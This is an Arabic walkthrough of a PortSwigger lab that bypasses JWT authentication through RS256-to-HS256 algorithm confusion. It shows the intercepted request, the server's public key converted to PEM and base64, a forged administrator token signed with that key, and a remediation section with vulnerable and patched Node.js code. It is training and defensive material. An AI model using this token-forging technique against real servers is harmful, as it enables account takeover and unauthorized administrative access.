# [JWT authentication bypass via algorithm confusion](https://portswigger.net/web-security/jwt/algorithm-confusion/lab-jwt-authentication-bypass-via-algorithm-confusion)

## **`الهدف`**
قم بالحصول على المفتاح العام الخاص بالسيرفر ثم استعمله لتوقيع `Session Token` معدل يسمح لك بالوصول إلى لوحة التحكم في `/admin` ثم حذف حساب `carlos`.
## **`خطوات الحل`**
نقوم بالدخول إلى حساب `wiener:peter` بعد ذلك نذهب إلى مسار `/admin` ولكن سنقوم باعتراض هذا الـ `request` ونقله إلى `repeater`
```http
GET /admin HTTP/2
Host: 0a14000903f4217082394380003c00f2.web-security-academy.net
Cookie: session=eyJraWQiOiJmY2RlZjFkNS05Zjk2LTRhZTktYWFhNS02NWJlZDllYzlmYmIiLCJhbGciOiJSUzI1NiJ9.eyJpc3MiOiJwb3J0c3dpZ2dlciIsImV4cCI6MTc4NTgyNTkxMSwic3ViIjoid2llbmVyIn0.F_JrKRAzaaZI-VMTNgdZruOUCqGvnjmxMaBBCXLF-XRqQxvPbphUJuZRVJ_gCazTYtfZ2eNAzk_pPzEr5uvklTm-HFETHjiKbu0yHDTYYvxN4h9nBtC19Capvin71niI2gcx2UWQDxOmd7Nx_vas1fHjeE6cA7uFcHJvVCrt-Cc_EtTDRBmvY9cN8bakNKnhoukPglktaV3nJbQV0FkOWTJmKXpXZKQc3niaRJJZKkJcTDmvNGpDvEraIOEMY91eekyuY6WRsHk9DCKkG4cXuy7ZwWVWeNFVQAUes_fAx9Xij9fma0iahP12tNzoI1S_7dGTtJORy0CIAbqkPCWlCg
```

وبعد ذلك سنذهب إلى مسار `/jwks.json` وسنلاحظ وجود المفتاح العام 
```JWK
{"kty":"RSA","e":"AQAB","use":"sig","kid":"fcdef1d5-9f96-4ae9-aaa5-65bed9ec9fbb","alg":"RS256","n":"w2Vz7vWhKZ_JyjtkscEQ0aVV7bQV-RT9-ZBAox11HV_53YZ-6w4fe1VW_2aQJCiPodo1L8WY-dr0yXcScl1HfCclNfFEFrBIz7Q3WwoVJ2fXxKPhbAYgP-tyHKc2EMqJmdfjt7J0nZJQOJw5HmFIKQ2tvEXNAc1W4QILP0A8L1RGfoToHHjL8JnQ6FP9CaK0WjvSSvSMFbmZocSRDf1p4t0jNGEYyULxgOBkRoP_fTkjQ6pM8Mb4JYx5hAru_G9lSGtn-UJMP6f13yjQNS121hnRHOxtrbWPM1vDJ2JDujQ1oMjERlYNpNCIeIw42tjBgvb0TGknz6iSbGbsdZAHbw"}
```

فنقوم بنسخه ونذهب إلى إضافة `JWT Editior` ونقوم بإضافة `New RSA Key` ثم نقوم بوضع المفتاح في حقل `Key` ونضغط على `PEM` ونقوم بنسخه بهذه الصيغة.
```PEM
-----BEGIN PUBLIC KEY-----  
MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEAw2Vz7vWhKZ/JyjtkscEQ  
0aVV7bQV+RT9+ZBAox11HV/53YZ+6w4fe1VW/2aQJCiPodo1L8WY+dr0yXcScl1H  
fCclNfFEFrBIz7Q3WwoVJ2fXxKPhbAYgP+tyHKc2EMqJmdfjt7J0nZJQOJw5HmFI  
KQ2tvEXNAc1W4QILP0A8L1RGfoToHHjL8JnQ6FP9CaK0WjvSSvSMFbmZocSRDf1p  
4t0jNGEYyULxgOBkRoP/fTkjQ6pM8Mb4JYx5hAru/G9lSGtn+UJMP6f13yjQNS12  
1hnRHOxtrbWPM1vDJ2JDujQ1oMjERlYNpNCIeIw42tjBgvb0TGknz6iSbGbsdZAH  
bwIDAQAB  
-----END PUBLIC KEY-----
```

ثم نذهب إلى `Burp Decoder` ونقوم بعمل `Encode Base64` له ونقوم بنسخه
```PEM-Encoded-Base64
LS0tLS1CRUdJTiBQVUJMSUMgS0VZLS0tLS0KTUlJQklqQU5CZ2txaGtpRzl3MEJBUUVGQUFPQ0FROEFNSUlCQ2dLQ0FRRUF3MlZ6N3ZXaEtaL0p5anRrc2NFUQowYVZWN2JRVitSVDkrWkJBb3gxMUhWLzUzWVorNnc0ZmUxVlcvMmFRSkNpUG9kbzFMOFdZK2RyMHlYY1NjbDFICmZDY2xOZkZFRnJCSXo3UTNXd29WSjJmWHhLUGhiQVlnUCt0eUhLYzJFTXFKbWRmanQ3SjBuWkpRT0p3NUhtRkkKS1EydHZFWE5BYzFXNFFJTFAwQThMMVJHZm9Ub0hIakw4Sm5RNkZQOUNhSzBXanZTU3ZTTUZibVpvY1NSRGYxcAo0dDBqTkdFWXlVTHhnT0JrUm9QL2ZUa2pRNnBNOE1iNEpZeDVoQXJ1L0c5bFNHdG4rVUpNUDZmMTN5alFOUzEyCjFoblJIT3h0cmJXUE0xdkRKMkpEdWpRMW9NakVSbFlOcE5DSWVJdzQydGpCZ3ZiMFRHa256NmlTYkdic2RaQUgKYndJREFRQUIKLS0tLS1FTkQgUFVCTElDIEtFWS0tLS0tCg==
```

ونعود مرة أخرى إلى إضافة `JWT Editior` ونقوم بإضافة `New Symmetric Key` ونضغط `Generate`. ثم نقوم بوضع النص الأخير الذي قمنا بنسخه فى معلم `k` لتصبح مكونات المفتاح كالتالي:
```JSON
{  
    "kty": "oct",  
    "kid": "9509716c-e559-48b9-86bb-c308a2fcc172",  
    "k": "LS0tLS1CRUdJTiBQVUJMSUMgS0VZLS0tLS0KTUlJQklqQU5CZ2txaGtpRzl3MEJBUUVGQUFPQ0FROEFNSUlCQ2dLQ0FRRUF3MlZ6N3ZXaEtaL0p5anRrc2NFUQowYVZWN2JRVitSVDkrWkJBb3gxMUhWLzUzWVorNnc0ZmUxVlcvMmFRSkNpUG9kbzFMOFdZK2RyMHlYY1NjbDFICmZDY2xOZkZFRnJCSXo3UTNXd29WSjJmWHhLUGhiQVlnUCt0eUhLYzJFTXFKbWRmanQ3SjBuWkpRT0p3NUhtRkkKS1EydHZFWE5BYzFXNFFJTFAwQThMMVJHZm9Ub0hIakw4Sm5RNkZQOUNhSzBXanZTU3ZTTUZibVpvY1NSRGYxcAo0dDBqTkdFWXlVTHhnT0JrUm9QL2ZUa2pRNnBNOE1iNEpZeDVoQXJ1L0c5bFNHdG4rVUpNUDZmMTN5alFOUzEyCjFoblJIT3h0cmJXUE0xdkRKMkpEdWpRMW9NakVSbFlOcE5DSWVJdzQydGpCZ3ZiMFRHa256NmlTYkdic2RaQUgKYndJREFRQUIKLS0tLS1FTkQgUFVCTElDIEtFWS0tLS0tCg=="  
}
```

ثم نضغط `OK` لنحفظه، نعود إلى الـ `request` الموجود في `repeater`، ونستعمل `Inspector` ونقوم بتظليل الجزء الخاص بالـ `Payload` في الـ `Session token` ونقوم بتعديل اسم `wiener` إلى `administrator`، ونقوم بتعديل معلم `alg` في الـ `Header` من `RS256` إلى `HS256` ثم نضغط على إختيار `JSON Web Token` ونقوم بالضغط على `Sign` مع التأكيد على إختيار `Don't modify header` ونقوم بإرسال الـ `request` لنتأكد من صحة الـ `response.

ثم سنقوم بنسخ كامل الـ `Session token` بعد التعديل، ونقوم بالذهاب إلى المتصفح داخل اللاب والضغط على `F12` ووضعها بدلًا من القديمة وعمل `refresh` للصفحة، ونستطيع بعد ذلك الدخول مرة أخرى إلى `/admin` وحذف حساب `carlos` لننتهي من حل اللاب.

==**`ملاحظة هامة جدًا:`**== هناك مشكلة فى أداة `JWS Editior` فى نظام تشغيل `Windows` حيث أنه عنده التحويل إلى صيغة `PEM` تقوم بإضافة `/r` أو `0D` في البايتس، في نهاية كل سطر وهذا يسبب تلف للمفتاح عند ترميزه `Base64` لذلك يجب أن تقوم يدويًا بالضغط على `Backspace` مرة واحدة فى نهاية كل سطر قبل الترميز، أو يمكن ببساطة لصق نص `PEM` في أداة نصوص خارج `Burp Suite` ثم إعادة نسخة مرة أخرى من أداة النصوص ثم لصقه في `Burp Decoder` فهذا سيزيل الـ `0D`
## **`ترقيع الثغرة`**
يجب إجبار السيرفر على خوارزمية محددة `Enforcing the Algorithm`، فلا يجب يجب أن يعتمد السيرفر أبداً على معلم `alg` المرسل داخل الـ `JWT` لتحديد كيفية فك التشفير، وبدلاً من ذلك، يجب على المبرمج تمرير الخوارزمية المتوقعة بشكل صريح `Explicitly` إلى دالة التحقق `Verify Function`.

`مثال برمجي باستخدام (Node.js - jsonwebtoken):`

`الكود المصاب (Vulnerable):`
```JS
// السيرفر يقبل أي خوارزمية يرسلها التوكن
jwt.verify(token, publicKey); 
```

`الكود المرقع (Patched):`
```JS
// السيرفر يُجبر على استخدام خوارزمية RS256 فقط ويرفض أي شيء آخر
jwt.verify(token, publicKey, { algorithms: ['RS256'] }); 
```

ويجب أن يكون هناك تحقق صارم من نوع المفتاح عن طريق تصميم النظام بحيث لا تقبل وظيفة التحقق الخاصة بخوارزميات `HMAC` (التي تتطلب مفتاحاً سرياً `String/Bytes`) استخدام مفتاح غير متماثل `Asymmetric Key` مثل مفاتيح `RSA` (التي تكون بصيغة `PEM` وتبدأ بـ `-----BEGIN PUBLIC KEY-----`)، فإن الفصل بين أنواع المفاتيح يمنع حدوث ارتباك `Confusion` داخل مكتبة التشفير

ويجب تحديث مكتبات الـ `JWT` بانتظام، لأن هذه الثغرة بالتحديد `Algorithm Confusion` ظهرت قديماً وأحدثت ضجة كبيرة (مُسجلة تحت ثغرات مثل `CVE-2015-9235` و `CVE-2022-23606` في بعض المكتبات)، لكن معظم مكتبات إدارة الـ `JWT` الحديثة في لغات البرمجة المختلفة تم تحديثها لتكون محمية افتراضياً من هذا الهجوم، إما بإجبار المطور على تحديد الخوارزمية أو برفض المفاتيح غير المتطابقة تلقائياً، لذلك فإن إبقاء الـ `Dependencies` مُحدثة هو خط دفاع أساسي.
